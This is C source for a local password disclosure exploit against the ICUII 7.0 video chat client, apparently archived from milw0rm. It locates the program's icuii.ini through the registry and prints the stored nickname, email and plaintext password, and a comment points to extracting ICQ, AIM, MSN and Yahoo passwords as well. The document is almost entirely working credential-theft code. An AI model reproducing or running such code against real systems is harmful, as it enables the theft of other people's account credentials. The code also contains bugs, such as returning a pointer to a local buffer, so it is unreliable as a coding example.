/*****************************************************************

ICUII 7.0 Local Password Disclosure Exploit by Kozan

Application: ICUII 7.0 (and probably prior versions)
Procuder: Cybration - www.icuii.com
Vulnerable Description: ICUII 7.0 discloses passwords to local users.

Discovered & Coded by Kozan
Credits to ATmaCA
www.netmagister.com - www.spyinstructors.com
kozan@netmagister.com

*****************************************************************/

#include <stdio.h>
#include <windows.h>

HKEY hKey;
#define BUFSIZE 100
char prgfiles[BUFSIZE];
DWORD dwBufLen=BUFSIZE;
LONG lRet;

int adresal(char *FilePath,char *Str)
{
char kr;
int Sayac=0;
int Offset=-1;
FILE *di;
di=fopen(FilePath,"rb");

if( di == NULL )
{
fclose(di);
return -1;
}

while(!feof(di))
{
Sayac++;
for(int i=0;i<strlen(Str);i++)
{
kr=getc(di);
if(kr != Str[i])
{
if( i>0 )
{
fseek(di,Sayac+1,SEEK_SET);
}
break;
}
if( i > ( strlen(Str)-2 ) )
{
Offset = ftell(di)-strlen(Str);
fclose(di);
return Offset;
}
}
}
fclose(di);
return -1;
}

char *oku(char *FilePath,char *Str)
{

FILE *di;
char cr;
int i=0;
char Feature[500];

int Offset = adresal(FilePath,Str);

if( Offset == -1 )
return "";

if( (di=fopen(FilePath,"rb")) == NULL )
return "";

fseek(di,Offset+strlen(Str),SEEK_SET);

while(!feof(di))
{
cr=getc(di);
if(cr == 0x0D)
break;
Feature[i] = cr;
i++;
}

Feature[i] = '\0';
fclose(di);
return Feature;
}

int main()
{
       if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,
                                       "SOFTWARE\\Microsoft\\Windows\\CurrentVersion",
                                       0,
                                       KEY_QUERY_VALUE,
                                       &hKey
                                       ) == ERROR_SUCCESS)
       {
       lRet = RegQueryValueEx( hKey, "ProgramFilesDir", NULL, NULL,(LPBYTE) prgfiles,
&dwBufLen);
       if( (lRet != ERROR_SUCCESS) || (dwBufLen > BUFSIZE) )
       {
               RegCloseKey(hKey);
               printf("An error occured!\n");
               return -1;
       }
       RegCloseKey(hKey);
       }

       strcat(prgfiles,"\\icuii\\icuii.ini");

       if(oku(prgfiles,"NickName=")=="")
       {
               printf("ICUII is not installed on your system!\n");
               return -1;
       }

       printf("ICUII 7.0 Local Password Disclosure Exploit by Kozan\n");
       printf("Credits to ATmaCA\n");
       printf("www.netmagister.com - www.spyinstructors.com\n");
       printf("kozan@netmagister.com\n\n");

       printf("Nickname: %s\n",oku(prgfiles,"NickName="));
       printf("Location: %s\n",oku(prgfiles,"Location="));
       printf("Comment : %s\n",oku(prgfiles,"Comment="));
       printf("E-Mail  : %s\n",oku(prgfiles,"Email="));
       printf("Password: %s\n",oku(prgfiles,"StartingPW="));

       /*
               This example exploit only shows main ICUII passwords.
               You may also get ICQ, AIM, MSN, Yahoo! passwords which are used within ICUII
       */

       return 0;
}

// milw0rm.com [2005-04-28]
